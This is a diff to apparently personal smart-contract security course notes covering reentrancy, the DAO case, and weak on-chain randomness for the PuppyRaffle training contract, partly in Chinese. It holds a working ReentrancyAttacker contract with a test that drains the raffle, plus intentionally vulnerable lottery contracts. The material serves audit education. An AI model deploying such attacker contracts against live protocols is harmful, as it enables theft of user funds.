@@ -66,16 +66,88 @@
     - [Tools and Frameworks](#tools-and-frameworks)
     - [Audit, Review, Audit, Repeat](#audit-review-audit-repeat)
     - [Communication](#communication)
-    - [Wrapping it Up](#wrapping-it-up)
+    - [Wrapping it Up-Timeboxing](#wrapping-it-up-timeboxing)
     - [The Audit Report and Follow Up](#the-audit-report-and-follow-up)
     - [Aftermath of a Missed Vulnerability](#aftermath-of-a-missed-vulnerability)
   - [Reconnaissance](#reconnaissance)
     - [Recon: Context](#recon-context)
+      - [First Step: Understanding The Codebase](#first-step-understanding-the-codebase)
+      - [Scoping Out The Files（Solidity Metrics）](#scoping-out-the-filessolidity-metrics)
     - [Recon: Understanding the Code](#recon-understanding-the-code)
+      - [How Tincho Cracked the Code](#how-tincho-cracked-the-code)
+      - [Understanding What the Codebase Is Supposed to Do](#understanding-what-the-codebase-is-supposed-to-do)
+      - [Scanning the Code from the Top](#scanning-the-code-from-the-top)
+      - [Taking Notes](#taking-notes)
+      - [Moving Further](#moving-further)
+      - [Looking at Functions](#looking-at-functions)
   - [Exploit](#exploit)
     - [Exploit: Accsess Control](#exploit-accsess-control)
+      - [The First Vulnerability](#the-first-vulnerability)
+      - [The Bug Explained](#the-bug-explained)
     - [Exploit: Public Data](#exploit-public-data)
+  - [Protocol Tests](#protocol-tests)
+  - [Writing an Amazing Finding(Finding #1)](#writing-an-amazing-findingfinding-1)
+    - [Phase #4: Reporting](#phase-4-reporting)
+    - [Writing an Amazing Finding: Title](#writing-an-amazing-finding-title)
+    - [Writing an Amazing Finding: Description](#writing-an-amazing-finding-description)
+    - [Writing an Amazing Finding: Proof of Code](#writing-an-amazing-finding-proof-of-code)
+    - [Writing an Amazing Finding: Recommended Mitigation](#writing-an-amazing-finding-recommended-mitigation)
+  - [Access Control(Finding #2)](#access-controlfinding-2)
+    - [Access Control Writeup](#access-control-writeup)
+    - [Missing Access Controls Proof of Code](#missing-access-controls-proof-of-code)
+  - [Finding Writeup Docs(Finding #3)](#finding-writeup-docsfinding-3)
+  - [Severity Rating](#severity-rating)
+      - [How to evaluate a finding severity](#how-to-evaluate-a-finding-severity)
+      - [How to evaluate the impact of a finding](#how-to-evaluate-the-impact-of-a-finding)
+      - [How to evaluate the likelihood of exploitation of a finding](#how-to-evaluate-the-likelihood-of-exploitation-of-a-finding)
+      - [Informational/Non-Crits/Gas Severity](#informationalnon-critsgas-severity)
+  - [Generate a PDF audit report](#generate-a-pdf-audit-report)
+  - [Isolated Dev Environments](#isolated-dev-environments)
 - [Puppy Raffle](#puppy-raffle)
+  - [Scoping](#scoping-1)
+  - [Tooling](#tooling)
+    - [Static Analysis - Boosting Your Auditing Efficiency](#static-analysis---boosting-your-auditing-efficiency)
+    - [Slither - A Python-Powered Static Analysis Tool](#slither---a-python-powered-static-analysis-tool)
+      - [Running Slither](#running-slither)
+    - [Aderyn-A Rust Based Static Analysis Tool](#aderyn-a-rust-based-static-analysis-tool)
+      - [Running Aderyn](#running-aderyn)
+    - [Solidity Metrics Insights](#solidity-metrics-insights)
+    - [Solidity Visual Developer](#solidity-visual-developer)
+  - [Recon(Reconnaissance) 1](#reconreconnaissance-1)
+    - [Reading Docs](#reading-docs)
+    - [Reading the Code](#reading-the-code)
+    - [Reading Docs II](#reading-docs-ii)
+  - [Exploit 1](#exploit-1)
+    - [sc-exploits-minimized](#sc-exploits-minimized)
+      - [Remix, CTFs, \& Challenge Examples](#remix-ctfs--challenge-examples)
+    - [Denial of Service](#denial-of-service)
+  - [DoS](#dos)
+    - [Case Study: DoS](#case-study-dos)
+      - [Case Study 1: Bridges Exchange](#case-study-1-bridges-exchange)
+        - [Attack Mechanics](#attack-mechanics)
+        - [Confirming the Attack Vector](#confirming-the-attack-vector)
+      - [Case Study 2: Dos Attack in GMX V2](#case-study-2-dos-attack-in-gmx-v2)
+        - [Attack Mechanics](#attack-mechanics-1)
+        - [Into the Code](#into-the-code)
+      - [Wrap Up](#wrap-up)
+    - [DoS PoC Puppy Raffle](#dos-poc-puppy-raffle)
+      - [Proof of Code](#proof-of-code)
+    - [DoS: Reporting](#dos-reporting)
+  - [Exploit: Business Logic Edge Case](#exploit-business-logic-edge-case)
+  - [Exploit: Reentrancy](#exploit-reentrancy)
+  - [Reentrancy: Mitigation](#reentrancy-mitigation)
+    - [CEI Pattern](#cei-pattern)
+    - [Alternative Mitigation-locking mechanism](#alternative-mitigation-locking-mechanism)
+    - [Case Study: The DAO](#case-study-the-dao)
+  - [Reentrancy: PoC](#reentrancy-poc)
+  - [Recon: Continued](#recon-continued)
+  - [Exploit: Weak Randomness](#exploit-weak-randomness)
+    - [什么是 blockhash？](#什么是-blockhash)
+    - [矿工如何操纵这些数据源？](#矿工如何操纵这些数据源)
+      - [1. block.timestamp（区块时间戳）](#1-blocktimestamp区块时间戳)
+      - [2. now（当前时间，已废弃）](#2-now当前时间已废弃)
+      - [3. blockhash（区块哈希）](#3-blockhash区块哈希)
+      - [防护措施对比](#防护措施对比)
 - [TSwap](#tswap)
 - [Thunder Loan](#thunder-loan)
 - [Boss Bridge](#boss-bridge)
@@ -193,6 +265,8 @@ So if ever you’re hunting for an exploit, or you have identified an attack whe
 
 
 # Attack Vectors
+
+![Top DeFi & Web3 Attack Vectors from the first half of 2025](SC-Security-note.assets/Top-10-2025.png)
 
 
 
@@ -2073,7 +2147,366 @@ When looking at this function, we have to ask *"Why is this returning zero?"*
 
 Arrays begin at index 0, were the player at this index to call this function it would be very unclear whether or not they were in the raffle or not!
 
+## Exploit: Reentrancy
 
+![exploit-reentrancy2](SC-Security-note.assets/exploit-reentrancy2.png)
+
+![exploit-reentrancy3](SC-Security-note.assets/exploit-reentrancy3.png)
+
+## Reentrancy: Mitigation
+
+### CEI Pattern
+
+*What's a CEI pattern?*
+
+I'm glad you asked!
+
+CEI stands for Checks, Effects and Interactions and is a best practice for orders of operation.
+
+1. Checks - require statements, conditions
+2. Effects - this is where you update the state of the contract
+3. Interactions - any interaction with external contracts/addresses come last
+
+```solidity
+function withdrawBalance() public {
+    // Checks
+    //Effects
+    uint256 balance = userBalance[msg.sender];
+    userBalance[msg.sender] = 0;
+    //Interactions
+    (bool success,) = msg.sender.call{value: balance}("");
+    if (!success) {
+        revert();
+    }
+}
+```
+
+Our function has no checks, but simply by reordering things this way, with our effects before interactions, we're guarded against re-entrancy. We can confirm this in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).
+
+![reentrancy-mitigation3](SC-Security-note.assets/reentrancy-mitigation3.png)
+
+### Alternative Mitigation-locking mechanism
+
+There is another popular way we can protect from re-entrancy and that's through a locking mechanism we could apply to this function.
+
+```solidity
+bool locked = false;
+function withdrawBalance() public {
+    if(locked){
+        revert;
+    }
+    locked = true;
+
+    // Checks
+    // Effects
+    uint256 balance = userBalance[msg.sender];
+    userBalance[msg.sender] = 0;
+    // Interactions
+    (bool success,) = msg.sender.call{value: balance}("");
+    if (!success) {
+        revert();
+    }
+    locked = false;
+}
+```
+
+This is called a `mutex lock` in computing science. By applying the above logic, we lock the function once it's called so that it can't be re-entered while locked!
+
+Along this line we also have the [**OpenZeppelin ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) library available to us. This effectively applies locks to our functions under the hood keeping our code clean and professional by leveraging the `nonReentrant` modifier.
+
+That's it! We've learnt 3 simple ways to protect against re-entrancy vulnerabilities in our code.
+
+1. Following CEI - Checks, Effects, Interactions Patterns
+2. Implementing a locking mechanism to our function
+3. Leveraging existing libraries from trust sources like [**OpenZeppelin's ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)
+
+### Case Study: The DAO
+
+[**The DAO**](https://en.wikipedia.org/wiki/The_DAO) was one of the most famous (or infamous) protocols in Web3 history. As of May 2016, its total value locked was ~14% of all ETH.
+
+Unfortunately, it suffered from a re-entrancy vulnerability in two of its functions.
+
+The first problem existed in the `splitDao` function, here's the vulnerable section and the whole contract for reference:
+
+```solidity
+contract DAO is DAOInterface, Token, TokenCreation {
+    ...
+    function splitDAO(
+        uint _proposalID,
+        address _newCurator
+    ) noEther onlyTokenholders returns (bool _success) {
+​
+    Transfer(msg.sender, 0, balances[msg.sender]);
+    withdrawRewardFor(msg.sender); // be nice, and get his rewards
+    totalSupply -= balances[msg.sender];
+    balances[msg.sender] = 0;
+    paidOut[msg.sender] = 0;
+    return true;
+    }
+}
+```
+
+
+
+## Reentrancy: PoC
+
+Returning to PuppyRaffle, let's look at how all we've learnt affects this protocol.
+
+A look again at this `refund` function and we see a classic case of reentrancy with an external call being made before updating state.
+
+```solidity
+function refund(uint256 playerIndex) public {
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+    // @Audit: Reentrancy
+    payable(msg.sender).sendValue(entranceFee);
+
+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+}
+```
+
+> **Note:** There *is* a `playersEntered` modifier we could use, included in this test suite, but we'll choose to be explicit here.
+
+Next we'll create our `ReentrancyAttacker` Contract.
+
+```solidity
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+    function _stealMoney() internal {
+    if (address(puppyRaffle).balance >= entranceFee) {
+        puppyRaffle.refund(attackerIndex);}
+    }
+    
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+}
+```
+
+Once deployed, this `attack` function is going to kick off the attack. In order, we're entering the raffle, acquiring our `playerIndex`, and then refunding our `entranceFee`.
+
+Adding these functions to our `ReentrancyAttacker` contract finishes the job. When funds are sent back to our contract, the `fallback` or `receive` functions are called which is going to trigger another `refund` call in our `_stealMoney` function, completing the loop until the `PuppyRaffle` contract is drained!
+
+```solidity
+function test_reentrancyRefund() public {
+    // users entering raffle
+    address[] memory players = new address[](4);
+    players[0] = playerOne;
+    players[1] = playerTwo;
+    players[2] = playerThree;
+    players[3] = playerFour;
+    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+​
+    // create attack contract and user
+    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+    address attacker = makeAddr("attacker");
+    vm.deal(attacker, 1 ether);
+​
+    // noting starting balances
+    uint256 startingAttackContractBalance = address(attackerContract).balance;
+    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+​
+    // attack
+    vm.prank(attacker);
+    attackerContract.attack{value: entranceFee}();
+​
+    // impact
+    console.log("attackerContract balance: ", startingAttackContractBalance);
+    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
+    console.log("ending attackerContract balance: ", address(attackerContract).balance);
+    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
+}
+```
+
+All we need to do now is run this test with the command `forge test --mt test_reentrancyRefund -vvv` and we should receive...
+
+![reentrancy-poc1](SC-Security-note.assets/reentrancy-poc1.png)
+
+We did it! We've proven the vulnerability through our application of our PoC and we'll absolutely be submitting this as a finding - likely a `High`.
+
+## Recon: Continued
+
+Let's continue with our manual review of PuppyRaffle. So far we've gone through
+
+- enterRaffle - where we uncovered a DoS vulnerability
+- refund - we discovered is vulnerable to reentrancy
+- getActivePlayerIndex - we found an edge case where players at index 0 aren't sure if they've entered the raffle!
+
+Walking through the code, we're moving onto the `selectWinner` function. This is a big one, we'll have a lot to go over.
+
+I encourage you to write these thoughts down in your `notes.md` file and actually write in-line notes to keep them organized. Being able to reference these thoughts during our write ups and later in the review is incredibly valuable to the process.
+
+```
+// @Audit: Does this follow CEI?
+
+// @Audit: Are the duration and time being set correctly?
+
+// @Audit: What is _safeMint doing after our external call?
+```
+
+It's important to note the `selectWinner` function is external, so anyone can call it. The checks in this function will be really important, but they do look good.
+
+Moving on, the next this thing function is doing is defining a `winnerIndex`.
+
+```
+uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
+
+address winner = players[winnerIndex];
+```
+
+It seems our function is using a pseudo-random number, modded by the player's array to choose our winning index. It then assigns the player at that index in the array to our `winner` variable.
+
+This winner variable is used further in the function to distribute the `prizePool` as well as mint the winning NFT.
+
+```
+(bool success,) = winner.call{value: prizePool}("");
+
+require(success, "PuppyRaffle: Failed to send prize pool to winner");
+
+_safeMint(winner, tokenId);
+```
+
+It's important that this selection is fair and truly random or this could be exploited by malicious actors fairly easily. My alarm bells are going off and I'm seeing a lot of red flags.
+
+## Exploit: Weak Randomness
+
+et's actually take a moment to go back to `Slither` because, if you can believe it, `Slither` will actually catch this for us.
+
+```
+slither .
+```
+
+Running slither as above we can see it's output contains the following:
+
+![weak-randomness1](SC-Security-note.assets/weak-randomness1.png)
+
+So what is this detector telling us - that `PuppyRaffle.sol` is using weak PRNG or Pseudo Random Number Generation. We can navigate to the [**link provided**](https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG) for more information and a simplified example of this vulnerability.
+
+![weak-randomness2](SC-Security-note.assets/weak-randomness2.png)
+
+### 什么是 blockhash？
+
+`blockhash` 是区块的哈希值，是通过对整个区块的内容（包括交易、时间戳、前一个区块哈希等）进行哈希运算得到的唯一标识符。
+
+```solidity
+// blockhash 的基本用法
+bytes32 currentBlockHash = blockhash(block.number - 1); // 获取前一个区块的哈希
+bytes32 specificBlockHash = blockhash(10000); // 获取第10000个区块的哈希
+```
+
+### 矿工如何操纵这些数据源？
+
+#### 1. block.timestamp（区块时间戳）
+
+**操纵方式**：
+- 矿工可以在一定范围内（通常15秒内）调整区块时间戳
+- 只要时间戳不早于父区块且不超过当前时间太多，网络就会接受
+
+**示例代码**：
+```solidity
+contract TimestampVulnerable {
+    uint256 public lastWinner;
+    
+    function lottery() public {
+        // 危险：使用时间戳作为随机数
+        uint256 random = block.timestamp % 100;
+        if (random < 10) {
+            lastWinner = uint256(uint160(msg.sender));
+            // 发放奖励
+        }
+    }
+}
+```
+
+**攻击场景**：
+```solidity
+// 矿工可以这样攻击：
+// 1. 计算不同时间戳下的结果
+// 2. 选择对自己有利的时间戳
+// 3. 在该时间戳下挖出区块
+```
+
+#### 2. now（当前时间，已废弃）
+
+**操纵方式**：
+- `now` 实际上就是 `block.timestamp` 的别名
+- 操纵方式与 `block.timestamp` 完全相同
+
+**示例代码**：
+```solidity
+contract NowVulnerable {
+    mapping(address => uint256) public balances;
+    
+    function timeBasedReward() public {
+        // 危险：now 等同于 block.timestamp
+        if (now % 60 < 10) { // 每分钟前10秒可以获得奖励
+            balances[msg.sender] += 100;
+        }
+    }
+}
+```
+
+#### 3. blockhash（区块哈希）
+
+**操纵方式**：
+- 矿工可以通过改变区块内容来影响区块哈希
+- 包括：调整交易顺序、包含不同的交易、修改时间戳等
+- 矿工可以重复尝试直到得到有利的哈希值
+
+**示例代码**：
+```solidity
+contract BlockhashVulnerable {
+    uint256 public prize = 1 ether;
+    address public winner;
+    
+    function guessNumber(uint256 guess) public {
+        // 危险：使用区块哈希作为随机数
+        uint256 random = uint256(blockhash(block.number - 1)) % 10;
+        
+        if (guess == random) {
+            winner = msg.sender;
+            payable(msg.sender).transfer(prize);
+        }
+    }
+}
+```
+
+#### 防护措施对比
+
+| 方法          | 安全性 | 成本 | 复杂度 |
+| ------------- | ------ | ---- | ------ |
+| Chainlink VRF | 高     | 中等 | 低     |
+| 提交-揭示     | 中等   | 低   | 中等   |
+| 多方随机数    | 中等   | 低   | 高     |
+| 区块哈希      | **低** | 低   | 低     |
+
+**总结：**矿工通过控制区块内容（时间戳、交易顺序、包含的交易等）来影响这些"随机"值，从而操纵游戏结果。这就是为什么需要使用真正的随机数服务。
+
+Beyond what's outlined here as a concern - that miners can influence global variables favorable - there's a lot more *weirdness* that goes into random numbers on-chain.
+
+If you've seen any of my other content, you know that Chainlink VRF is a solution for this problem, and I encourage you to check out the [**documentation**](https://docs.chain.link/vrf) for some additional learnings.
 
 
 
